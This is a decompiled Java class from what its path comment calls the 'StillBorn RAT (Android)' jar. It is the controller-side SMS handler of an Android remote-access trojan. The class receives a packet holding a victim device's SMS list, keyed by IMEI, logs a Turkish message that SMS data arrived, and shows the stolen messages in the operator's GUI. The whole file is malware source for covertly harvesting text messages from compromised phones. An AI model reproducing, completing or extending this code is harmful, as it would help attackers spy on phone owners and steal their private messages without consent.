/*  1:   */ package handler;
/*  2:   */ 
/*  3:   */ import Packet.Packet;
/*  4:   */ import Packet.SMSTreePacket;
/*  5:   */ import gui.GUI;
/*  6:   */ import java.util.HashMap;
/*  7:   */ import server.Server;
/*  8:   */ 
/*  9:   */ public class SMSHandler
/* 10:   */   implements PacketHandler
/* 11:   */ {
/* 12:   */   private GUI gui;
/* 13:   */   private int channel;
/* 14:   */   private String imei;
/* 15:   */   
/* 16:   */   public SMSHandler(int chan, String imei, GUI gui)
/* 17:   */   {
/* 18:37 */     this.channel = chan;
/* 19:38 */     this.imei = imei;
/* 20:39 */     this.gui = gui;
/* 21:   */   }
/* 22:   */   
/* 23:   */   public void receive(Packet p, String imei) {}
/* 24:   */   
/* 25:   */   public void handlePacket(Packet p, String temp_imei, Server c)
/* 26:   */   {
/* 27:49 */     this.gui.logTxt("SMS bilgisi alındı");
/* 28:50 */     ((ChannelDistributionHandler)c.getChannelHandlerMap().get(this.imei)).removeListener(this.channel);
/* 29:51 */     SMSTreePacket packet = (SMSTreePacket)p;
/* 30:   */     
/* 31:53 */     this.gui.updateSMS(this.imei, packet.getList());
/* 32:   */   }
/* 33:   */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     handler.SMSHandler
 * JD-Core Version:    0.7.0.1
 */